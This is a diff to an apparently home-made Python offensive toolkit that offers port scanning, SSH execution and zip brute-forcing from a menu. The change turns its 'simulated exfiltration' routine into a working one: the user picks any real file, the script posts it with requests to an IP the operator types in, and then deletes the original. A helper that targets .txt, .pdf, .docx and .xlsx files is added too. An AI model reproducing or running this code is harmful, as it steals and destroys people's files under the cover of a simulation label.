@@ -12,7 +12,7 @@
 
 #!/usr/bin/python3
 
-import getpass, gzip, os, paramiko, re, shutil, sys, tarfile, time, wget
+import getpass, gzip, os, paramiko, re, requests, shutil, subprocess, sys, tarfile, time, wget
 from ipaddress import ip_network
 from scapy.all import IP, ICMP, TCP, sr1, send, RandShort
 from zipfile import ZipFile
@@ -229,13 +229,16 @@ def execSSH():
                 break
 
 #######################
-# cool little file selector to locate zipped files -next three functions. original draft from prompt engineering w gpt
+# this section is a cool little file selector to locate zipped files - next five functions. original draft from prompt engineering w gpt
 # https://chat.openai.com/share/0446b349-68d2-4fcf-bf10-5a50563183d5
 def is_zip_file(filename):
     return filename.endswith('.zip')
 
+def is_sensitive_file(filename):
+    sensitive_extensions = ['.txt', '.pdf', '.docx', '.xlsx']
+    return any(filename.endswith(ext) for ext in sensitive_extensions)
+
 def list_directory_contents(directory):
-    """List the contents of the given directory in alphabetical order."""
     print(f"\nContents of '{directory}':")
     contents = os.listdir(directory)
     contents.sort()  # Sort the contents alphabetically
@@ -243,6 +246,7 @@ def list_directory_contents(directory):
         print(f"{i}. {content}")
     print()
 
+# requires selection to be zipped
 def search_for_file():
     zFilename = None
     current_directory = os.getcwd()  # Start from the current working directory
@@ -311,6 +315,64 @@ def search_for_file():
             print("Invalid input. Please try again.")
 
     return zFilename
+
+# same as above but no requirement for zip
+def search_for_sensitive():
+    filename = None
+    current_directory = os.getcwd()  # Start from the current working directory
+
+    while True:
+        input_path = input("Enter the base directory to start the search (e.g., /home/user/Documents) or '.' for the current directory: ").strip()
+        if input_path == '.':
+            break  # Accept the current directory
+        elif os.path.isdir(input_path):
+            current_directory = os.path.abspath(input_path)  # Convert to absolute path
+            break
+        else:
+            print("Invalid input. Please enter a valid directory path.")
+
+    while True:
+        # List the contents of the current directory
+        contents = os.listdir(current_directory)
+        contents.sort()  # Sort the contents alphabetically
+        print(f"\nContents of '{current_directory}':")
+        for i, content in enumerate(contents, 1):
+            print(f"{i}. {content}")
+        
+        # User input to navigate or select a file
+        user_choice = input("Enter the number of the item, 'up' to go to the parent directory, 'cancel' to cancel, or the name of the file if you see it: ").strip()
+
+        if user_choice.isdigit():
+            choice_index = int(user_choice) - 1
+            if 0 <= choice_index < len(contents):
+                selected_item = contents[choice_index]
+                chosen_path = os.path.join(current_directory, selected_item)
+                if os.path.isdir(chosen_path):
+                    current_directory = chosen_path  # Navigate into the selected directory
+                elif os.path.isfile(chosen_path):  # Check if the selected item is a file
+                    filename = chosen_path
+                    print(f"File '{selected_item}' selected.")
+                    break
+                else:
+                    print("The selected item is not a file. Please try again.")
+            else:
+                print("Invalid selection. Please try again.")
+        elif user_choice == 'up':
+            if os.path.dirname(current_directory) == current_directory:
+                print("You are at the root directory. Cannot go up.")
+            else:
+                current_directory = os.path.dirname(current_directory)  # Navigate up one directory level
+        elif user_choice == 'cancel':
+            print("Operation cancelled by user.")
+            break
+        elif os.path.isfile(os.path.join(current_directory, user_choice)):  # Check if the input is a direct file name
+            filename = os.path.join(current_directory, user_choice)
+            print(f"File '{user_choice}' selected.")
+            break
+        else:
+            print("Invalid input. Please try again.")
+
+    return filename
 
 #######################
 # open main function to brute force crack open zipped files
@@ -401,9 +463,15 @@ def getTgt2():
     # spit out CIDR
     return target
 
+# open identical function to get output IP for exfil
+def getTgt3():
+    # get user input
+    target = input("enter the IP address to exfiltrate data: ")
+    print(f"\ngot it, sending to {target}\n")
+    return target
+
 #######################
 # get target ports from user as list
-
 def getPort():
     # declare empty list
     portList = []
@@ -552,41 +620,40 @@ def scan_up_hosts(hostList):
         print("\nRESULTS for host", host, ":\n")
         print(test)
 
+#######################
+# open a function to 'simulate' exfiltration of data; includes call for file enumeration script
+def simulated_exfiltration(search_for_sensitive):
+    print("\nSimulated Exfiltration Attempt starting...\n\n")
 
+    # call search_for_sensitive function to find a sensitive file on the affected
+    filename = search_for_sensitive()
+    if not filename:
+        print("No file selected for exfiltration. Exiting the simulated attempt.")
+        return
 
-
-
-import requests  # For making HTTP requests to simulate data exfiltration
-import os        # For file operations
-import json      # For JSON operations if needed
-
-def simulated_exfiltration():
-    print("Simulated Exfiltration Attempt starting...")
-    
-    # Your exfiltration simulation code will go here.
-    # For instance, you could create a dummy file and try to 'exfiltrate' it to an external server.
-
-    # Creating a dummy file with sensitive data simulation
-    with open('dummy_sensitive_data.txt', 'w') as file:
-        file.write('simulated sensitive content')
+    # Confirm the file selection
+    print(f"\nSelected file for exfiltration: {filename}\n")
 
     # Attempt to send the file to an external server
-    url = 'http://example.com/receiver'  # Replace with your receiving server URL
-    files = {'file': open('dummy_sensitive_data.txt', 'rb')}
-    
+    url = getTgt3()
+    files = {'file': open(filename, 'rb')}
+
     try:
         response = requests.post(url, files=files)
         print(f"File sent. Server response: {response.text}")
+
     except requests.exceptions.RequestException as e:
         print(f"Exfiltration attempt failed: {e}")
+
+    finally:
+        files['file'].close()
+
     
-    # Remember to remove the dummy file if necessary
-    os.remove('dummy_sensitive_data.txt')
+    if os.path.exists(filename):
+        os.remove(filename)
 
-
-import subprocess  # For executing shell commands
-import sys         # For system-specific parameters and functions
-
+#######################
+# .. 
 def anomaly_based_execution():
     print("Anomaly-Based Script Execution starting...")
     
@@ -614,10 +681,6 @@ def anomaly_based_execution():
 
 ###########################################################################################################
 ###########################################################################################################
-
-import sys
-
-# Define other functions here (tcp_port_scan, icmp_ping_sweep, scan_up_hosts, execSSH, execZip, simulated_exfiltration, anomaly_based_execution)
 
 def main_menu():
     hostList = []
@@ -649,7 +712,7 @@ def main_menu():
         elif choice == '5':
             execZip()
         elif choice == '6':
-            simulated_exfiltration()
+            simulated_exfiltration(search_for_sensitive)
         elif choice == '7':
             anomaly_based_execution()
         elif choice == '8' or choice.lower() == 'q':
